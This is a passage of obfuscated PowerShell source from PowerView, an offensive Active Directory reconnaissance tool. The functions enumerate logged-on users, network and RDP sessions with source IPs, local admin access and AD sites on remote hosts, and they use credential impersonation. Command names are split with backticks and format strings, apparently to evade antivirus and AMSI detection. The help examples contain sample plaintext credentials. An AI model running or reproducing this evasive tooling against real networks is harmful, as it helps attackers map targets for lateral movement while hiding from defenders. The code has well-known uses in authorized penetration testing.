    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Com`P`UtE`Rn`AMe} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedenT`i`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${p`s`BouN`dpA`RAM`ETERs}['Credential']) {
            ${lOG`o`NtOkeN} = &("{3}{4}{1}{5}{6}{2}{0}" -f'ation','e','person','I','nvoke-Us','rI','m') -Credential ${c`RE`DeNtial}
        }
    }

    PROCESS {
        ForEach (${ComPuT`Er} in ${coMPu`Ter`Name}) {
            # declare the reference variables
            ${qUERyl`E`Vel} = 1
            ${PTrI`N`FO} = [IntPtr]::Zero
            ${eNTr`I`es`REad} = 0
            ${t`otaL`REAd} = 0
            ${r`e`sumEHand`lE} = 0

            # get logged on user information
            ${rEs`U`lt} = ${NE`Tap`I32}::NetWkstaUserEnum(${Co`Mpu`T`eR}, ${QUeRYl`Ev`eL}, [ref]${pTr`In`FO}, -1, [ref]${eNTR`i`esr`EAd}, [ref]${t`OtAlR`Ead}, [ref]${RE`s`U`mEHAnDLE})

            # locate the offset of the initial intPtr
            ${o`FfsET} = ${Pt`RiN`Fo}.ToInt64()

            # 0 = success
            if ((${rES`U`LT} -eq 0) -and (${oFF`S`ET} -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                ${in`cr`EMeNt} = ${Wk`st`A_`UsER_iN`FO_1}::GetSize()

                # parse all the result structures
                for (${I} = 0; (${I} -lt ${E`NtRiEs`ReAD}); ${i}++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    ${nEW`inT`PTR} = &("{3}{1}{2}{0}"-f 't','w-O','bjec','Ne') ("{1}{3}{0}{2}" -f'ntp','Syst','tr','em.I') -ArgumentList ${Off`sET}
                    ${IN`FO} = ${NEw`I`N`TPTR} -as ${wK`s`Ta_uSeR`_`iNFo_1}

                    # return all the sections of the structure - have to do it this way for V2
                    ${l`Ogge`DON} = ${I`NfO} | &("{1}{2}{0}" -f'bject','Sel','ect-O') ('*')
                    ${lOgGe`d`on} | &("{0}{1}{2}"-f'Ad','d-M','ember') ("{3}{0}{1}{2}"-f'r','t','y','Noteprope') 'ComputerName' ${Co`M`pUTER}
                    ${lOG`gEdOn}.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    ${oFFS`et} = ${ne`w`iNtPtr}.ToInt64()
                    ${o`Ffset} += ${iN`CrEme`Nt}
                    ${LoGge`d`On}
                }

                # free up the result buffer
                ${Nu`lL} = ${nETaP`i`32}::NetApiBufferFree(${pTR`iNfo})
            }
            else {
                &("{3}{0}{2}{1}" -f 'ite-Verb','se','o','Wr') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if (${loGo`NTok`en}) {
            &("{0}{3}{2}{1}{4}" -f'Invoke-Reve','Sel','To','rt','f') -TokenHandle ${L`Ogo`N`TOKen}
        }
    }
}


function G`e`T-Net`SE`SsiOn {
<#
.SYNOPSIS

Returns session information for the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetSessionEnum Win32API call to query
a given host for active sessions.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetSession

Returns active sessions on the local host.

.EXAMPLE

Get-NetSession -ComputerName sqlserver

Returns active sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetSession

Returns active sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.SessionInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the CName/UserName/Time/IdleTime for each session, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${t`RuE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMpuT`ErN`A`mE} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CredeN`T`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PsbouNDPAr`Am`et`E`Rs}['Credential']) {
            ${lOGO`NTOK`eN} = &("{3}{4}{0}{2}{1}"-f'o','ion','nat','Invo','ke-UserImpers') -Credential ${C`REDEnt`i`AL}
        }
    }

    PROCESS {
        ForEach (${COMP`U`TEr} in ${COm`P`U`TE`RNamE}) {
            # arguments for NetSessionEnum
            ${q`U`eRyl`EVeL} = 10
            ${Ptr`I`NfO} = [IntPtr]::Zero
            ${eNTrI`eSr`e`Ad} = 0
            ${T`OTA`lREad} = 0
            ${reSUmEhan`d`lE} = 0

            # get session information
            ${RE`s`ULT} = ${NE`T`APi32}::NetSessionEnum(${c`OmP`UT`er}, '', ${use`Rna`Me}, ${Q`Uer`Y`LeveL}, [ref]${pt`RIN`Fo}, -1, [ref]${entRi`ES`RE`AD}, [ref]${to`T`ALREAd}, [ref]${rES`Umeh`A`ND`LE})

            # locate the offset of the initial intPtr
            ${o`FfSeT} = ${p`TRi`Nfo}.ToInt64()

            # 0 = success
            if ((${Re`su`Lt} -eq 0) -and (${o`F`FSeT} -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                ${In`crE`MENt} = ${SesSiO`N`_INfo`_`10}::GetSize()

                # parse all the result structures
                for (${I} = 0; (${I} -lt ${eNtRI`ESR`E`AD}); ${i}++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    ${nEwi`N`TpTR} = &("{0}{2}{1}"-f 'New-Ob','t','jec') ("{1}{2}{0}"-f 'tr','System.Int','p') -ArgumentList ${o`Ff`SEt}
                    ${i`NFO} = ${N`ew`in`TPtr} -as ${SE`SS`i`o`N_info_10}

                    # return all the sections of the structure - have to do it this way for V2
                    ${SE`s`SION} = ${in`Fo} | &("{1}{0}{2}" -f'ele','S','ct-Object') ('*')
                    ${sE`SS`ioN} | &("{2}{0}{1}" -f'M','ember','Add-') ("{0}{1}{2}"-f'Notepro','pert','y') 'ComputerName' ${CO`MpUt`er}
                    ${SeSs`I`oN}.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    ${OfF`s`ET} = ${NEWI`NT`ptR}.ToInt64()
                    ${o`FF`SeT} += ${inCr`eM`EnT}
                    ${s`essiON}
                }

                # free up the result buffer
                ${n`ULL} = ${N`eTaP`I32}::NetApiBufferFree(${ptRi`N`Fo})
            }
            else {
                &("{0}{2}{1}{4}{3}" -f 'W','V','rite-','ose','erb') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if (${L`OGo`NTOKen}) {
            &("{0}{2}{1}{3}" -f 'Invok','S','e-RevertTo','elf') -TokenHandle ${LoG`OnT`ok`En}
        }
    }
}


function ge`T-rEgLogg`eDoN {
<#
.SYNOPSIS

Returns who is logged onto the local (or a remote) machine
through enumeration of remote registry keys.

Note: This function requires only domain user rights on the
machine you're enumerating, but remote registry must be enabled.

Author: Matt Kelly (@BreakersAll)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  

.DESCRIPTION

This function will query the HKU registry values to retrieve the local
logged on users SID and then attempt and reverse it.
Adapted technique from Sysinternal's PSLoggedOn script. Benefit over
using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
required (NetWkstaUserEnum requires remote admin access).

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-RegLoggedOn

Returns users actively logged onto the local host.

.EXAMPLE

Get-RegLoggedOn -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-RegLoggedOn

Returns users actively logged on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RegLoggedOnUser

A PSCustomObject including the UserDomain/UserName/UserSID of each
actively logged on user, with the ComputerName added.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`oMpUTER`NA`Me} = 'localhost'
    )

    BEGIN {
        if (${pSB`Oundpar`A`Me`Te`Rs}['Credential']) {
            ${L`o`Gontok`en} = &("{0}{4}{2}{1}{3}"-f 'In','mpersonati','ke-UserI','on','vo') -Credential ${cre`D`eNtiAL}
        }
    }

    PROCESS {
        ForEach (${cOMP`U`TER} in ${coMPUtE`R`NAme}) {
            try {
                # retrieve HKU remote registry values
                ${r`EG} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # sort out bogus sid's like _class
                ${r`EG}.GetSubKeyNames() | &("{3}{1}{0}{2}" -f'-Obj','ere','ect','Wh') { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | &("{3}{0}{1}{2}" -f 'orEac','h-Objec','t','F') {
                    ${U`se`RnaMe} = &("{2}{3}{0}{1}"-f'I','D','ConvertFrom','-S') -ObjectSID ${_} -OutputType 'DomainSimple'

                    if (${uS`ErnA`Me}) {
                        ${us`eRN`AmE}, ${u`S`eR`DOmAin} = ${U`seRNA`mE}.Split('@')
                    }
                    else {
                        ${u`s`eRNaME} = ${_}
                        ${us`ERdo`ma`iN} = ${N`ULl}
                    }

                    ${rEg`l`ogGeD`oNuS`Er} = &("{0}{2}{1}" -f'New-Ob','ct','je') ("{1}{0}{2}"-f 'bjec','PSO','t')
                    ${rEgLog`ged`on`U`SeR} | &("{2}{0}{1}"-f'-Memb','er','Add') ("{3}{2}{0}{1}"-f'rope','rty','p','Note') 'ComputerName' "$ComputerName"
                    ${R`e`GLOgGEDOnu`s`eR} | &("{2}{0}{1}"-f '-','Member','Add') ("{0}{1}{2}"-f'Notep','rope','rty') 'UserDomain' ${u`sERD`Om`AIn}
                    ${ReGLoGgE`D`O`NUsER} | &("{2}{1}{0}"-f'er','emb','Add-M') ("{0}{2}{1}"-f 'Notepr','ty','oper') 'UserName' ${Us`ER`Name}
                    ${rEG`l`ogg`Edo`NUsEr} | &("{1}{2}{0}" -f 'ber','Add-Me','m') ("{1}{0}{3}{2}"-f'pr','Note','erty','op') 'UserSID' ${_}
                    ${rEg`LoGGEd`O`NUser}.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    ${REgL`OGGEDONU`s`eR}
                }
            }
            catch {
                &("{3}{0}{1}{2}"-f 'rite-V','e','rbose','W') "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if (${lO`GoNtO`keN}) {
            &("{4}{0}{1}{2}{3}"-f'v','o','ke-Reve','rtToSelf','In') -TokenHandle ${LO`GON`ToK`en}
        }
    }
}


function G`ET-nET`RdPsE`SSi`oN {
<#
.SYNOPSIS

Returns remote desktop/session information for the local (or a remote) machine.

Note: only members of the Administrators or Account Operators local group
can successfully execute this functionality on a remote target.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
Win32API calls to query a given RDP remote service for active sessions and originating
IPs. This is a replacement for qwinsta.

.PARAMETER ComputerName

Specifies the hostname to query for active sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetRDPSession

Returns active RDP/terminal sessions on the local host.

.EXAMPLE

Get-NetRDPSession -ComputerName "sqlserver"

Returns active RDP/terminal sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetRDPSession

Returns active RDP/terminal sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetRDPSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RDPSessionInfo

A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
with the ComputerName added.

.LINK

https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
#>

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`MP`UTERNAme} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`dEn`TIal} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PS`Bou`N`dP`AramETERs}['Credential']) {
            ${L`OgONtoK`eN} = &("{2}{1}{4}{5}{3}{0}{6}" -f't','serImp','Invoke-U','a','er','son','ion') -Credential ${CRE`DE`N`TIAL}
        }
    }

    PROCESS {
        ForEach (${coMpuT`er} in ${coM`pUtE`RnA`ME}) {

            # open up a handle to the Remote Desktop Session host
            ${H`A`NDle} = ${WT`sAPI`32}::WTSOpenServerEx(${COmpUT`Er})

            # if we get a non-zero handle back, everything was successful
            if (${Ha`N`DLe} -ne 0) {

                # arguments for WTSEnumerateSessionsEx
                ${p`Ps`ESSiOn`I`NFo} = [IntPtr]::Zero
                ${pc`o`UNt} = 0

                # get information on all current sessions
                ${res`U`Lt} = ${WT`s`ApI32}::WTSEnumerateSessionsEx(${han`D`lE}, [ref]1, 0, [ref]${pps`EsSi`oNin`Fo}, [ref]${p`C`Ount});${LASt`ER`R`oR} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # locate the offset of the initial intPtr
                ${o`FfS`Et} = ${p`P`SeSSi`OnI`NFO}.ToInt64()

                if ((${Re`sulT} -ne 0) -and (${of`FseT} -gt 0)) {

                    # work out how much to increment the pointer by finding out the size of the structure
                    ${InCr`em`ENt} = ${WT`s_`s`essio`N_iNFo_1}::GetSize()

                    # parse all the result structures
                    for (${i} = 0; (${I} -lt ${Pcou`Nt}); ${I}++) {

                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        ${new`In`Tptr} = &("{2}{3}{1}{0}" -f 'Object','w-','N','e') ("{3}{1}{2}{0}"-f'tptr','ys','tem.In','S') -ArgumentList ${o`FfseT}
                        ${IN`FO} = ${NEw`INTp`Tr} -as ${W`TS`_s`ES`siO`N_InfO_1}

                        ${RD`pSE`SsION} = &("{1}{0}{2}"-f'-','New','Object') ("{2}{1}{0}"-f 't','SObjec','P')

                        if (${I`NFo}.pHostName) {
                            ${Rd`ps`EsS`ION} | &("{2}{0}{1}"-f'embe','r','Add-M') ("{0}{2}{1}" -f 'Notepr','ty','oper') 'ComputerName' ${IN`Fo}.pHostName
                        }
                        else {
                            # if no hostname returned, use the specified hostname
                            ${r`dpS`essi`on} | &("{2}{1}{0}{3}"-f'b','-Mem','Add','er') ("{0}{2}{1}"-f'Note','y','propert') 'ComputerName' ${cOM`pu`T`er}
                        }

                        ${rD`p`sESSIoN} | &("{2}{1}{0}"-f'mber','dd-Me','A') ("{1}{0}{2}"-f'otepro','N','perty') 'SessionName' ${iN`Fo}.pSessionName

                        if ($(-not ${i`NfO}.pDomainName) -or (${IN`Fo}.pDomainName -eq '')) {
                            # if a domain isn't returned just use the username
                            ${R`d`pseSs`IoN} | &("{1}{0}{2}" -f 'd','Ad','-Member') ("{2}{0}{1}{3}"-f 'teprop','er','No','ty') 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            ${R`dpSe`ssI`oN} | &("{3}{2}{1}{0}" -f 'er','b','m','Add-Me') ("{3}{2}{0}{1}" -f'pro','perty','te','No') 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rD`P`S`esSIoN} | &("{2}{0}{3}{1}"-f'dd-Me','r','A','mbe') ("{1}{3}{2}{0}" -f'y','N','opert','otepr') 'ID' ${in`FO}.SessionID
                        ${r`D`pSeSSioN} | &("{0}{1}{2}"-f'Add','-','Member') ("{1}{0}{2}"-f 'r','Notep','operty') 'State' ${IN`Fo}.State

                        ${PPBuf`FeR} = [IntPtr]::Zero
                        ${PBYTe`sRE`T`URnEd} = 0

                        # query for the source client IP with WTSQuerySessionInformation
                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                        ${RE`sU`Lt2} = ${wTSaP`I`32}::WTSQuerySessionInformation(${h`AN`dlE}, ${iN`FO}.SessionID, 14, [ref]${PpbU`Ffer}, [ref]${PBy`T`eS`REtu`RnED});${lAST`ERr`O`R2} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (${r`Es`ULt2} -eq 0) {
                            &("{0}{2}{3}{1}"-f 'Wr','se','ite-V','erbo') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            ${O`Ffs`et2} = ${PP`BUF`F`Er}.ToInt64()
                            ${Ne`wInT`PT`R2} = &("{1}{2}{3}{0}"-f 'bject','Ne','w','-O') ("{3}{2}{0}{1}" -f 'Intp','tr','ystem.','S') -ArgumentList ${Of`Fs`Et2}
                            ${In`Fo2} = ${Ne`Wi`NTpT`R2} -as ${WTS_`clI`en`T_add`R`Ess}

                            ${SOur`cE`iP} = ${IN`F`o2}.Address
                            if (${Sour`ce`ip}[2] -ne 0) {
                                ${S`OU`RcEIP} = [String]${SourcE`ip}[2]+'.'+[String]${S`our`CEIp}[3]+'.'+[String]${sO`U`RCeiP}[4]+'.'+[String]${SOUR`C`EIP}[5]
                            }
                            else {
                                ${so`URC`eIP} = ${n`ULl}
                            }

                            ${RdPS`E`ssi`on} | &("{2}{0}{1}{3}" -f'dd-','Me','A','mber') ("{2}{1}{3}{0}" -f 'rty','o','N','teprope') 'SourceIP' ${sO`U`RcEip}
                            ${r`dP`SeS`SiON}.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            ${r`DPSeSs`IOn}

                            # free up the memory buffer
                            ${NU`Ll} = ${W`Ts`API32}::WTSFreeMemory(${p`pB`UFfER})

                            ${O`Ffs`eT} += ${iNCrE`ME`Nt}
                        }
                    }
                    # free up the memory result buffer
                    ${N`UlL} = ${WT`SAP`i32}::WTSFreeMemoryEx(2, ${PPSE`SSi`O`N`info}, ${p`cOUnT})
                }
                else {
                    &("{0}{2}{1}"-f'Wr','e','ite-Verbos') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # close off the service handle
                ${NU`ll} = ${Wt`saPI`32}::WTSCloseServer(${ha`Nd`LE})
            }
            else {
                &("{3}{0}{1}{2}" -f'e','-Verbos','e','Writ') "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if (${L`oGOn`TOk`EN}) {
            &("{2}{0}{1}{3}"-f 'voke-R','ev','In','ertToSelf') -TokenHandle ${LO`g`ONTO`Ken}
        }
    }
}


function Tes`T`-ADM`ina`CcEsS {
<#
.SYNOPSIS

Tests if the current user has administrative access to the local (or a remote) machine.

Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'  
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'  
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'  

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the OpenSCManagerW Win32API call to establish
a handle to the remote host. If this succeeds, the current user context
has local administrator acess to the target.

.PARAMETER ComputerName

Specifies the hostname to check for local admin access (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Test-AdminAccess -ComputerName sqlserver

Returns results indicating whether the current user has admin access to the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Test-AdminAccess

Returns what machines in the domain the current user has access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.AdminAccess

A PSCustomObject containing the ComputerName and 'IsAdmin' set to whether
the current user has local admin rights, along with the ComputerName added.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMpUte`RNa`me} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDeNtiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PSb`Ou`NDpA`RamE`TE`RS}['Credential']) {
            ${logOntO`K`EN} = &("{4}{3}{5}{6}{1}{0}{2}" -f'rsonat','erImpe','ion','e','Invok','-','Us') -Credential ${cRE`DeNT`Ial}
        }
    }

    PROCESS {
        ForEach (${COMpu`TEr} in ${Compu`T`eRNAmE}) {
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            ${HA`ND`LE} = ${Ad`V`Api32}::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);${L`AsTER`R`or} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            ${IsadM`iN} = &("{0}{3}{1}{2}"-f 'N','e','ct','ew-Obj') ("{0}{1}{2}"-f'PSO','bje','ct')
            ${Is`Ad`MiN} | &("{1}{0}{2}" -f '-Mem','Add','ber') ("{0}{2}{1}{3}"-f'No','e','t','property') 'ComputerName' ${c`OMPUtEr}

            # if we get a non-zero handle back, everything was successful
            if (${hAn`D`le} -ne 0) {
                ${N`ULl} = ${a`DvaP`i`32}::CloseServiceHandle(${H`AnD`le})
                ${iSaD`M`IN} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{0}{2}{1}{3}" -f'No','epr','t','operty') 'IsAdmin' ${tR`Ue}
            }
            else {
                &("{0}{1}{2}{3}" -f 'Writ','e-Verb','o','se') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                ${I`sA`DMIN} | &("{3}{2}{0}{1}"-f 'm','ber','dd-Me','A') ("{0}{1}{3}{2}" -f'Notepro','p','rty','e') 'IsAdmin' ${FaL`sE}
            }
            ${is`Ad`min}.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            ${i`s`AdMIn}
        }
    }

    END {
        if (${logoN`T`o`kEn}) {
            &("{3}{0}{1}{2}"-f'ertT','oSel','f','Invoke-Rev') -TokenHandle ${Logont`O`k`EN}
        }
    }
}


function g`et-NETCOmputersI`T`en`AMe {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer | Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OmPuTeR`NaME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRED`e`N`TIAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${psbou`N`dP`Aram`ET`ERs}['Credential']) {
            ${LO`GonT`okEN} = &("{4}{2}{1}{3}{0}"-f'ation','mperso','oke-UserI','n','Inv') -Credential ${CR`e`DenTiAL}
        }
    }

    PROCESS {
        ForEach (${C`Ompu`TER} in ${C`O`MPU`T`ErnamE}) {
            # if we get an IP address, try to resolve the IP to a hostname
            if (${COMpu`T`er} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${IPA`DdRe`ss} = ${c`OM`puTEr}
                ${c`OM`pUTer} = [System.Net.Dns]::GetHostByAddress(${cO`m`Puter}) | &("{3}{2}{1}{0}" -f 'Object','ct-','ele','S') -ExpandProperty ("{1}{0}{2}" -f'os','H','tName')
            }
            else {
                ${IP`ADDre`ss} = @(&("{0}{1}{3}{2}"-f 'Reso','lve-','dress','IPAd') -ComputerName ${cOmp`U`TEr})[0].IPAddress
            }

            ${Ptr`i`NFO} = [IntPtr]::Zero

            ${ReS`Ult} = ${n`E`TApI32}::DsGetSiteName(${cOmp`U`Ter}, [ref]${pt`Ri`NFo})

            ${cO`MPUTER`SITE} = &("{2}{0}{1}" -f 'ew-Ob','ject','N') ("{0}{1}{2}" -f'PSO','b','ject')
            ${cO`m`PuTerSI`Te} | &("{1}{2}{0}" -f'er','Ad','d-Memb') ("{1}{3}{0}{2}"-f 'prop','No','erty','te') 'ComputerName' ${CO`mpu`Ter}
            ${co`M`PuT`E`RsitE} | &("{3}{0}{1}{2}" -f'Mem','b','er','Add-') ("{2}{0}{1}"-f 'pr','operty','Note') 'IPAddress' ${IPAD`dRe`ss}

            if (${R`ESU`lT} -eq 0) {
                ${SI`TENAmE} = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${PT`RiN`FO})
                ${COm`puTerS`i`TE} | &("{1}{2}{0}" -f'mber','Add','-Me') ("{1}{2}{3}{0}"-f 'y','N','o','tepropert') 'SiteName' ${s`i`T`EnAme}
            }
            else {
                &("{1}{0}{2}"-f'erbos','Write-V','e') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                ${cOmPU`TeR`sITe} | &("{2}{3}{1}{0}" -f 'Member','-','A','dd') ("{1}{2}{0}"-f 'ty','Noteprope','r') 'SiteName' ''
            }
            ${c`Ompute`Rsi`Te}.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # free up the result buffer
            ${nu`ll} = ${nEta`P`i32}::NetApiBufferFree(${PtRiN`FO})

            ${C`OM`PuTe`RSi`Te}
        }
    }

    END {
        if (${Lo`go`NTO`Ken}) {
            &("{0}{6}{1}{4}{3}{2}{5}"-f 'Invok','R','e','rtToS','eve','lf','e-') -TokenHandle ${LO`GONToK`en}
        }
    }
}


function get`-`W`mirEGpROXY {
<#
.SYNOPSIS

Enumerates the proxy server and WPAD conents for the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates the proxy server and WPAD specification for the current user
on the local machine (default), or a machine specified with -ComputerName.
It does this by enumerating settings from
HKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings.

.PARAMETER ComputerName

Specifies the system to enumerate proxy settings on. Defaults to the local host.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

